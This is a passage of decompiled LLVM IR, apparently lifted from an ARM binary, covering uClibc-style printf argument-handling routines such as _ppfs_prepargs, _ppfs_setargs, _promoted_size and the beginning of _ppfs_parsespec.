  store i32 %v1_14e74, i32* %r2.global-to-local, align 4
  %v7_14e78 = icmp eq i8 %v3_14e74, 37
  br i1 %v7_14e78, label %dec_label_pc_14ea4, label %dec_label_pc_14e80

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e74
  %v1_14e80 = load i32, i32* @r4, align 4
  %v2_14e80 = inttoptr i32 %v1_14e80 to i32*
  store i32 %v1_14e74, i32* %v2_14e80, align 4
  %v0_14e84 = load i32, i32* @r4, align 4
  %v1_14e88 = inttoptr i32 %v0_14e84 to i8*
  %v2_14e88 = call i32 @_ppfs_parsespec(i8* %v1_14e88)
  %v1_14e8c = icmp slt i32 %v2_14e88, 0
  br i1 %v1_14e8c, label %dec_label_pc_14e94, label %dec_label_pc_14e9c

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e80
  %v2_14e98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14e98, i32* @r4, align 4
  store i32 %v6_14e24, i32* @r5, align 4
  ret i32 -1

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e80
  %v0_14e9c = load i32, i32* @r4, align 4
  %v1_14e9c = inttoptr i32 %v0_14e9c to i32*
  %v2_14e9c = load i32, i32* %v1_14e9c, align 4
  br label %dec_label_pc_14ea8.backedge

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14e6c, %dec_label_pc_14e74
  %v0_14ea4 = phi i32 [ %v0_14e74, %dec_label_pc_14e6c ], [ %v1_14e74, %dec_label_pc_14e74 ]
  %v1_14ea4 = add i32 %v0_14ea4, 1
  br label %dec_label_pc_14ea8.backedge

dec_label_pc_14ea8.backedge:                      ; preds = %dec_label_pc_14ea4, %dec_label_pc_14e9c
  %storemerge = phi i32 [ %v1_14ea4, %dec_label_pc_14ea4 ], [ %v2_14e9c, %dec_label_pc_14e9c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14ea8 = inttoptr i32 %storemerge to i8*
  %v2_14ea8 = load i8, i8* %v1_14ea8, align 1
  %v2_14eac = icmp eq i8 %v2_14ea8, 0
  br i1 %v2_14eac, label %dec_label_pc_14ea8.dec_label_pc_14eb4_crit_edge, label %dec_label_pc_14e6c

dec_label_pc_14ea8.dec_label_pc_14eb4_crit_edge:  ; preds = %dec_label_pc_14ea8.backedge
  %v0_14eb4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14eb4

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14ea8.dec_label_pc_14eb4_crit_edge, %dec_label_pc_14e64
  %v0_14eb4 = phi i32 [ %v0_14eb4.pre, %dec_label_pc_14ea8.dec_label_pc_14eb4_crit_edge ], [ %v0_14e64, %dec_label_pc_14e64 ]
  %v3_14ea8.lcssa.in = phi i8 [ %v2_14ea8, %dec_label_pc_14ea8.dec_label_pc_14eb4_crit_edge ], [ %v2_14ea84, %dec_label_pc_14e64 ]
  %v3_14ea8.lcssa = zext i8 %v3_14ea8.lcssa.in to i32
  %v1_14eb4 = load i32, i32* @r4, align 4
  %v2_14eb4 = inttoptr i32 %v1_14eb4 to i32*
  store i32 %v0_14eb4, i32* %v2_14eb4, align 4
  %v2_14eb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14eb8, i32* @r4, align 4
  store i32 %v6_14e24, i32* @r5, align 4
  ret i32 %v3_14ea8.lcssa

; uselistorder directives
  uselistorder i8 %v2_14ea8, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14e64, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e5c, { 1, 0 }
  uselistorder i32 %v0_14e58.pre, { 1, 0 }
  uselistorder i32 %v6_14e24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_14ea4, { 1, 0 }
  uselistorder label %dec_label_pc_14e6c, { 1, 0 }
  uselistorder label %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14ebc = load i32, i32* @r4, align 4
  store i32 %v3_14ebc, i32* %stack_var_-12, align 4
  %v6_14ebc = load i32, i32* @r5, align 4
  %v1_14ec0 = add i32 %arg1, 24
  %v2_14ec0 = inttoptr i32 %v1_14ec0 to i32*
  %v3_14ec0 = load i32, i32* %v2_14ec0, align 4
  store i32 %v3_14ec0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14ecc = add i32 %arg1, 76
  %v3_14ecc = inttoptr i32 %v2_14ecc to i32*
  store i32 %arg2, i32* %v3_14ecc, align 4
  %tmp4 = icmp slt i32 %v3_14ec0, 1
  br i1 %tmp4, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v7_14ed0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_14ed0, i32* @r4, align 4
  store i32 %v6_14ebc, i32* @r5, align 4
  ret i32 %arg1

bb5:                                              ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_14ed8 = add i32 %arg1, 8
  %v3_14ed8 = inttoptr i32 %v2_14ed8 to i32*
  store i32 0, i32* %v3_14ed8, align 4
  %v0_14edc = load i32, i32* @r5, align 4
  %v2_14edc = add i32 %arg1, 28
  %v3_14edc = inttoptr i32 %v2_14edc to i32*
  store i32 %v0_14edc, i32* %v3_14edc, align 4
  %v0_14ee0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14ee0, i32* %v2_14ec0, align 4
  %v0_14ee4 = load i32, i32* %r3.global-to-local, align 4
  %v2_14ee4 = add i32 %arg1, 4
  %v3_14ee4 = inttoptr i32 %v2_14ee4 to i32*
  store i32 %v0_14ee4, i32* %v3_14ee4, align 4
  %v0_14ee8 = call i32 @_ppfs_setargs()
  %v0_14eec = load i32, i32* @r5, align 4
  %v1_14eec = load i32, i32* @r4, align 4
  %v2_14eec = add i32 %v1_14eec, 24
  %v3_14eec = inttoptr i32 %v2_14eec to i32*
  store i32 %v0_14eec, i32* %v3_14eec, align 4
  %v2_14ef0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ef0, i32* @r4, align 4
  store i32 %v6_14ebc, i32* @r5, align 4
  ret i32 %v0_14ee8

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 5, 4, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_14ef4 = load i32, i32* @r0, align 4
  %v1_14ef4 = add i32 %v0_14ef4, 24
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  store i32 %v3_14ef4, i32* %r1.global-to-local, align 4
  %v2_14ef8 = icmp eq i32 %v3_14ef4, 0
  %v3_14efc = load i32, i32* @r4, align 4
  store i32 %v3_14efc, i32* %stack_var_-12, align 4
  %v1_14f00 = add i32 %v0_14ef4, 8
  %v2_14f00 = inttoptr i32 %v1_14f00 to i32*
  %v3_14f00 = load i32, i32* %v2_14f00, align 4
  store i32 %v3_14f00, i32* %r3.global-to-local, align 4
  %v6_14f08 = icmp eq i32 %v3_14f00, -2147483648
  br i1 %v2_14ef8, label %dec_label_pc_14f08, label %dec_label_pc_15030

dec_label_pc_14f08:                               ; preds = %entry
  br i1 %v6_14f08, label %dec_label_pc_14f10, label %dec_label_pc_14f28

dec_label_pc_14f10:                               ; preds = %dec_label_pc_14f08
  %v1_14f10 = add i32 %v0_14ef4, 76
  %v2_14f10 = inttoptr i32 %v1_14f10 to i32*
  %v3_14f10 = load i32, i32* %v2_14f10, align 4
  store i32 %v3_14f10, i32* %r3.global-to-local, align 4
  %v1_14f14 = inttoptr i32 %v3_14f10 to i32*
  %v2_14f14 = load i32, i32* %v1_14f14, align 4
  store i32 %v2_14f14, i32* %r2.global-to-local, align 4
  %v1_14f18 = add i32 %v3_14f10, 4
  store i32 %v1_14f18, i32* %r3.global-to-local, align 4
  store i32 %v1_14f18, i32* %v2_14f10, align 4
  %v0_14f20 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f20 = load i32, i32* @r0, align 4
  %v2_14f20 = add i32 %v1_14f20, 8
  %v3_14f20 = inttoptr i32 %v2_14f20 to i32*
  store i32 %v0_14f20, i32* %v3_14f20, align 4
  %v0_14f24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f24 = load i32, i32* @r0, align 4
  %v2_14f24 = add i32 %v1_14f24, 80
  %v3_14f24 = inttoptr i32 %v2_14f24 to i32*
  store i32 %v0_14f24, i32* %v3_14f24, align 4
  %v0_14f28.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f08, %dec_label_pc_14f10
  %v1_14f44 = phi i32 [ %v0_14ef4, %dec_label_pc_14f08 ], [ %v0_14f28.pre, %dec_label_pc_14f10 ]
  %v1_14f28 = add i32 %v1_14f44, 4
  %v2_14f28 = inttoptr i32 %v1_14f28 to i32*
  %v3_14f28 = load i32, i32* %v2_14f28, align 4
  store i32 %v3_14f28, i32* %r3.global-to-local, align 4
  %v6_14f2c = icmp eq i32 %v3_14f28, -2147483648
  %v1_14f30 = add i32 %v1_14f44, 80
  store i32 %v1_14f30, i32* @lr, align 4
  br i1 %v6_14f2c, label %dec_label_pc_14f38, label %dec_label_pc_14f50

dec_label_pc_14f38:                               ; preds = %dec_label_pc_14f28
  %v1_14f38 = add i32 %v1_14f44, 76
  %v2_14f38 = inttoptr i32 %v1_14f38 to i32*
  %v3_14f38 = load i32, i32* %v2_14f38, align 4
  store i32 %v3_14f38, i32* %r3.global-to-local, align 4
  %v1_14f3c = inttoptr i32 %v3_14f38 to i32*
  %v2_14f3c = load i32, i32* %v1_14f3c, align 4
  store i32 %v2_14f3c, i32* %r2.global-to-local, align 4
  %v1_14f40 = add i32 %v3_14f38, 4
  store i32 %v1_14f40, i32* %r3.global-to-local, align 4
  store i32 %v1_14f40, i32* %v2_14f38, align 4
  %v0_14f48 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f48 = load i32, i32* @r0, align 4
  %v2_14f48 = add i32 %v1_14f48, 4
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  store i32 %v0_14f48, i32* %v3_14f48, align 4
  %v0_14f4c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f4c = load i32, i32* @r0, align 4
  %v2_14f4c = add i32 %v1_14f4c, 80
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v0_14f4c, i32* %v3_14f4c, align 4
  %v0_1502019.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14f50

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14f28, %dec_label_pc_14f38
  %v0_1502019 = phi i32 [ %v1_14f44, %dec_label_pc_14f28 ], [ %v0_1502019.pre, %dec_label_pc_14f38 ]
  store i32 2055, i32* %r5.global-to-local, align 4
  %v0_14f54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14f54, i32* %r4.global-to-local, align 4
  %v1_1502020 = add i32 %v0_1502019, 28
  %v2_1502021 = inttoptr i32 %v1_1502020 to i32*
  %v3_1502022 = load i32, i32* %v2_1502021, align 4
  store i32 %v3_1502022, i32* %r3.global-to-local, align 4
  %v5_1502824 = icmp slt i32 %v0_14f54, %v3_1502022
  br i1 %v5_1502824, label %dec_label_pc_14f5c, label %dec_label_pc_1502c.loopexit

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f50, %dec_label_pc_15020.backedge
  %v0_1502026 = phi i32 [ %v0_15020, %dec_label_pc_15020.backedge ], [ %v0_1502019, %dec_label_pc_14f50 ]
  %v0_14f6825 = phi i32 [ %v0_14f68.be, %dec_label_pc_15020.backedge ], [ %v0_14f54, %dec_label_pc_14f50 ]
  %v4_14f5c = mul i32 %v0_14f6825, 4
  %v5_14f5c = add i32 %v4_14f5c, %v0_1502026
  store i32 %v5_14f5c, i32* %r3.global-to-local, align 4
  %v1_14f60 = add i32 %v5_14f5c, 40
  %v2_14f60 = inttoptr i32 %v1_14f60 to i32*
  %v3_14f60 = load i32, i32* %v2_14f60, align 4
  store i32 %v3_14f60, i32* %r3.global-to-local, align 4
  %v7_14f64 = icmp eq i32 %v3_14f60, 8
  %v1_14f68 = add i32 %v0_14f6825, 1
  store i32 %v1_14f68, i32* %r4.global-to-local, align 4
  br i1 %v7_14f64, label %dec_label_pc_15020.backedge, label %dec_label_pc_14f70

dec_label_pc_14f70:                               ; preds = %dec_label_pc_14f5c
  %v1_14f70 = add i32 %v0_1502026, 76
  %v2_14f70 = inttoptr i32 %v1_14f70 to i32*
  %v3_14f70 = load i32, i32* %v2_14f70, align 4
  store i32 %v3_14f70, i32* %ip.global-to-local, align 4
  %v8_14f74 = icmp sgt i32 %v3_14f60, 8
  br i1 %v8_14f74, label %dec_label_pc_14f98, label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f70
  %v7_14f78 = icmp eq i32 %v3_14f60, 2
  br i1 %v7_14f78, label %dec_label_pc_14fe0, label %dec_label_pc_14f80

dec_label_pc_14f80:                               ; preds = %dec_label_pc_14f78
  %v8_14f80 = icmp sgt i32 %v3_14f60, 2
  br i1 %v8_14f80, label %dec_label_pc_14f90, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f80
  %v1_14f84 = icmp slt i32 %v3_14f60, 0
  br i1 %v1_14f84, label %dec_label_pc_1500c, label %dec_label_pc_14fe0

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f80
  %v7_14f90 = icmp eq i32 %v3_14f60, 7
  br i1 %v7_14f90, label %dec_label_pc_14ff4, label %dec_label_pc_1500c

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14f70
  %v7_14f98 = icmp eq i32 %v3_14f60, 1024
  br i1 %v7_14f98, label %dec_label_pc_14fe0, label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f98
  %v8_14fa0 = icmp sgt i32 %v3_14f60, 1024
  br i1 %v8_14fa0, label %dec_label_pc_14fb8, label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14fa0
  switch i32 %v3_14f60, label %dec_label_pc_1500c [
    i32 256, label %dec_label_pc_14fe0
    i32 512, label %dec_label_pc_14fe0
  ]

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14fa0
  %v7_14fb8 = icmp eq i32 %v3_14f60, 2048
  br i1 %v7_14fb8, label %dec_label_pc_14fcc, label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14fb8
  %v1_14fc0 = load i32, i32* %r5.global-to-local, align 4
  %v9_14fc0 = icmp eq i32 %v3_14f60, %v1_14fc0
  br i1 %v9_14fc0, label %dec_label_pc_14ff4, label %dec_label_pc_1500c

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fb8
  %v1_14fcc = inttoptr i32 %v3_14f70 to i32*
  %v2_14fcc = load i32, i32* %v1_14fcc, align 4
  store i32 %v2_14fcc, i32* %r1.global-to-local, align 4
  %v3_14fcc = add i32 %v3_14f70, 4
  %v4_14fcc = inttoptr i32 %v3_14fcc to i32*
  %v5_14fcc = load i32, i32* %v4_14fcc, align 4
  store i32 %v5_14fcc, i32* %r2.global-to-local, align 4
  %v1_14fd0 = add i32 %v3_14f70, 8
  store i32 %v1_14fd0, i32* %r3.global-to-local, align 4
  store i32 %v1_14fd0, i32* %v2_14f70, align 4
  %v0_14fd8 = load i32, i32* @lr, align 4
  %v1_14fd8 = inttoptr i32 %v0_14fd8 to i32*
  %v2_14fd8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14fd8, i32* %v1_14fd8, align 4
  %v3_14fd8 = add i32 %v0_14fd8, 4
  %v4_14fd8 = inttoptr i32 %v3_14fd8 to i32*
  %v5_14fd8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_14fd8, i32* %v4_14fd8, align 4
  br label %dec_label_pc_1501c

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14fa4, %dec_label_pc_14f84, %dec_label_pc_14f98, %dec_label_pc_14f78
  %v1_14fe0 = inttoptr i32 %v3_14f70 to i32*
  %v2_14fe0 = load i32, i32* %v1_14fe0, align 4
  store i32 %v2_14fe0, i32* %r2.global-to-local, align 4
  %v1_14fe4 = add i32 %v3_14f70, 4
  store i32 %v1_14fe4, i32* %r3.global-to-local, align 4
  store i32 %v1_14fe4, i32* %v2_14f70, align 4
  %v0_14fec = load i32, i32* %r2.global-to-local, align 4
  %v1_14fec = load i32, i32* @lr, align 4
  %v2_14fec = inttoptr i32 %v1_14fec to i32*
  store i32 %v0_14fec, i32* %v2_14fec, align 4
  br label %dec_label_pc_1501c

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14f90, %dec_label_pc_14fc4
  %v3_14ff4 = load i32, i32* %v2_14f70, align 4
  store i32 %v3_14ff4, i32* %r3.global-to-local, align 4
  %v1_14ff8 = inttoptr i32 %v3_14ff4 to i32*
  %v2_14ff8 = load i32, i32* %v1_14ff8, align 4
  store i32 %v2_14ff8, i32* %r1.global-to-local, align 4
  %v3_14ff8 = add i32 %v3_14ff4, 4
  %v4_14ff8 = inttoptr i32 %v3_14ff8 to i32*
  %v5_14ff8 = load i32, i32* %v4_14ff8, align 4
  store i32 %v5_14ff8, i32* %r2.global-to-local, align 4
  %v1_14ffc = add i32 %v3_14ff4, 8
  store i32 %v1_14ffc, i32* %r3.global-to-local, align 4
  store i32 %v1_14ffc, i32* %v2_14f70, align 4
  %v0_15004 = load i32, i32* @lr, align 4
  %v1_15004 = inttoptr i32 %v0_15004 to i32*
  %v2_15004 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15004, i32* %v1_15004, align 4
  %v3_15004 = add i32 %v0_15004, 4
  %v4_15004 = inttoptr i32 %v3_15004 to i32*
  %v5_15004 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_15004, i32* %v4_15004, align 4
  br label %dec_label_pc_1501c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14f90, %dec_label_pc_14f84, %dec_label_pc_14fc4
  %v1_1500c = add i32 %v3_14f70, 4
  store i32 %v1_1500c, i32* %r3.global-to-local, align 4
  store i32 %v1_1500c, i32* %v2_14f70, align 4
  %v0_15014 = load i32, i32* %ip.global-to-local, align 4
  %v1_15014 = inttoptr i32 %v0_15014 to i32*
  %v2_15014 = load i32, i32* %v1_15014, align 4
  store i32 %v2_15014, i32* %r3.global-to-local, align 4
  %v1_15018 = load i32, i32* @lr, align 4
  %v2_15018 = inttoptr i32 %v1_15018 to i32*
  store i32 %v2_15014, i32* %v2_15018, align 4
  br label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_14ff4, %dec_label_pc_14fe0, %dec_label_pc_14fcc, %dec_label_pc_1500c
  %v0_1501c = load i32, i32* @lr, align 4
  %v1_1501c = add i32 %v0_1501c, 8
  store i32 %v1_1501c, i32* @lr, align 4
  %v0_15024.pre.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_15020.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15020.backedge

dec_label_pc_15020.backedge:                      ; preds = %dec_label_pc_1501c, %dec_label_pc_14f5c
  %v0_15020 = phi i32 [ %v0_15020.pre, %dec_label_pc_1501c ], [ %v0_1502026, %dec_label_pc_14f5c ]
  %v0_14f68.be = phi i32 [ %v0_15024.pre.pre, %dec_label_pc_1501c ], [ %v1_14f68, %dec_label_pc_14f5c ]
  %v1_15020 = add i32 %v0_15020, 28
  %v2_15020 = inttoptr i32 %v1_15020 to i32*
  %v3_15020 = load i32, i32* %v2_15020, align 4
  store i32 %v3_15020, i32* %r3.global-to-local, align 4
  %v5_15028 = icmp slt i32 %v0_14f68.be, %v3_15020
  br i1 %v5_15028, label %dec_label_pc_14f5c, label %dec_label_pc_15020.dec_label_pc_1502c.loopexit_crit_edge

dec_label_pc_15030:                               ; preds = %entry
  br i1 %v6_14f08, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15030
  %v2_15034 = add i32 %v0_14ef4, 36
  %v3_15034 = inttoptr i32 %v2_15034 to i8*
  %v4_15034 = load i8, i8* %v3_15034, align 1
  %v5_15034 = zext i8 %v4_15034 to i32
  %v5_15038 = mul nuw nsw i32 %v5_15034, 8
  %v6_15038 = add i32 %v5_15038, %v0_14ef4
  store i32 %v6_15038, i32* %r3.global-to-local, align 4
  %v2_1503c = add i32 %v6_15038, 72
  %v3_1503c = inttoptr i32 %v2_1503c to i32*
  %v4_1503c = load i32, i32* %v3_1503c, align 4
  store i32 %v4_1503c, i32* %r3.global-to-local, align 4
  store i32 %v4_1503c, i32* %v2_14f00, align 4
  %v0_15044.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15030, %bb
  %v2_15058 = phi i32 [ %v0_15044.pre, %bb ], [ %v0_14ef4, %dec_label_pc_15030 ]
  %v1_15044 = add i32 %v2_15058, 4
  %v2_15044 = inttoptr i32 %v1_15044 to i32*
  %v3_15044 = load i32, i32* %v2_15044, align 4
  store i32 %v3_15044, i32* %r3.global-to-local, align 4
  %v6_15048 = icmp eq i32 %v3_15044, -2147483648
  br i1 %v6_15048, label %bb16, label %dec_label_pc_1502c

bb16:                                             ; preds = %.thread1
  %v2_1504c = add i32 %v2_15058, 37
  %v3_1504c = inttoptr i32 %v2_1504c to i8*
  %v4_1504c = load i8, i8* %v3_1504c, align 1
  %v5_1504c = zext i8 %v4_1504c to i32
  %v5_15050 = mul nuw nsw i32 %v5_1504c, 8
  %v6_15050 = add i32 %v5_15050, %v2_15058
  store i32 %v6_15050, i32* %r3.global-to-local, align 4
  %v2_15054 = add i32 %v6_15050, 72
  %v3_15054 = inttoptr i32 %v2_15054 to i32*
  %v4_15054 = load i32, i32* %v3_15054, align 4
  store i32 %v4_15054, i32* %r3.global-to-local, align 4
  store i32 %v4_15054, i32* %v2_15044, align 4
  %v0_1505c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1502c

dec_label_pc_15020.dec_label_pc_1502c.loopexit_crit_edge: ; preds = %dec_label_pc_15020.backedge
  br label %dec_label_pc_1502c.loopexit

dec_label_pc_1502c.loopexit:                      ; preds = %dec_label_pc_15020.dec_label_pc_1502c.loopexit_crit_edge, %dec_label_pc_14f50
  %v0_15020.lcssa = phi i32 [ %v0_15020, %dec_label_pc_15020.dec_label_pc_1502c.loopexit_crit_edge ], [ %v0_1502019, %dec_label_pc_14f50 ]
  br label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_1502c.loopexit, %.thread1, %bb16
  %v1_1507c = phi i32 [ %v0_15020.lcssa, %dec_label_pc_1502c.loopexit ], [ %v2_15058, %.thread1 ], [ %v0_1505c.pre, %bb16 ]
  %v1_1505c = add i32 %v1_1507c, 8
  %v2_1505c = inttoptr i32 %v1_1505c to i32*
  %v3_1505c = load i32, i32* %v2_1505c, align 4
  store i32 %v3_1505c, i32* %r1.global-to-local, align 4
  %v1_15060 = icmp slt i32 %v3_1505c, 0
  br i1 %v1_15060, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_1502c
  %v5_15064 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15064, i32* @r4, align 4
  ret i32 %v1_1507c

bb18:                                             ; preds = %dec_label_pc_1502c
  %v1_15068 = add i32 %v1_1507c, 16
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  %v3_15068 = load i32, i32* %v2_15068, align 4
  %v1_15070 = sub i32 0, %v3_1505c
  store i32 %v1_15070, i32* %r1.global-to-local, align 4
  %v1_1506c = and i32 %v3_15068, -10
  %v1_15074 = or i32 %v1_1506c, 8
  store i32 %v1_15074, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_1507c = add i32 %v1_1507c, 20
  %v3_1507c = inttoptr i32 %v2_1507c to i32*
  store i32 32, i32* %v3_1507c, align 4
  %v0_15080 = load i32, i32* %r1.global-to-local, align 4
  %v1_15080 = load i32, i32* @r0, align 4
  %v2_15080 = add i32 %v1_15080, 8
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  store i32 %v0_15080, i32* %v3_15080, align 4
  %v0_15084 = load i32, i32* %r3.global-to-local, align 4
  %v1_15084 = load i32, i32* @r0, align 4
  %v2_15084 = add i32 %v1_15084, 16
  %v3_15084 = inttoptr i32 %v2_15084 to i32*
  store i32 %v0_15084, i32* %v3_15084, align 4
  %v2_15088 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15088, i32* @r4, align 4
  %v11_15088 = load i32, i32* @r0, align 4
  ret i32 %v11_15088

; uselistorder directives
  uselistorder i32 %v2_15058, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14f68.be, { 1, 0 }
  uselistorder i32 %v0_15020, { 1, 2, 0 }
  uselistorder i32 %v3_14ff4, { 0, 2, 1, 3 }
  uselistorder i32 %v3_14f70, { 5, 1, 0, 2, 4, 3, 6 }
  uselistorder i32* %v2_14f70, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_14f60, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_14f6825, { 1, 0 }
  uselistorder i32 %v0_1502026, { 0, 2, 1 }
  uselistorder i32 %v0_1502019, { 2, 0, 1 }
  uselistorder i32 %v0_14ef4, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0, 17, 18, 19, 20, 21, 22 }
  uselistorder label %dec_label_pc_1502c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1501c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1500c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14ff4, { 1, 0 }
  uselistorder label %dec_label_pc_14fe0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %dec_label_pc_14f50, { 1, 0 }
  uselistorder label %dec_label_pc_14f28, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_150ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_150b4, %entry
  %v0_15098 = phi i32 [ %v1_15098, %dec_label_pc_150b4 ], [ ptrtoint (i32* @global_var_246fa.1354 to i32), %entry ]
  %v1_15098 = add i32 %v0_15098, -2
  %v1_1509c = inttoptr i32 %v1_15098 to i8*
  %v2_1509c = load i8, i8* %v1_1509c, align 2
  %v3_1509c = zext i8 %v2_1509c to i32
  %v1_150a0 = add i32 %v0_15098, -1
  %v2_150a0 = inttoptr i32 %v1_150a0 to i8*
  %v3_150a0 = load i8, i8* %v2_150a0, align 1
  %v4_150a0 = zext i8 %v3_150a0 to i32
  %v3_150a4 = mul nuw i32 %v3_1509c, 16777216
  %v4_150a8 = sdiv i32 %v3_150a4, 65536
  %v5_150a8 = or i32 %v4_150a8, %v4_150a0
  %v9_150ac = icmp eq i32 %v5_150a8, %v1_150ac.pre
  %.pre = sub i32 %v1_15098, ptrtoint (i32* @global_var_246e2.1356 to i32)
  br i1 %v9_150ac, label %dec_label_pc_150bc, label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %dec_label_pc_15098
  %tmp = icmp ugt i32 %v1_15098, ptrtoint (i32* @global_var_246e2.1356 to i32)
  br i1 %tmp, label %dec_label_pc_15098, label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_15098, %dec_label_pc_150b4
  store i32 ptrtoint (i32* @global_var_246fa.1354 to i32), i32* @r2, align 4
  %v4_150c8 = sdiv i32 %.pre, 2
  %v5_150c8 = add i32 %v4_150c8, ptrtoint (i32* @global_var_246fa.1354 to i32)
  %v6_150c8 = inttoptr i32 %v5_150c8 to i8*
  %v7_150c8 = load i8, i8* %v6_150c8, align 1
  %v9_150c8 = zext i8 %v7_150c8 to i32
  ret i32 %v9_150c8

; uselistorder directives
  uselistorder i32 %v1_15098, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15098, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_246fa.1354 to i32), { 1, 2, 0 }
  uselistorder label %dec_label_pc_150bc, { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
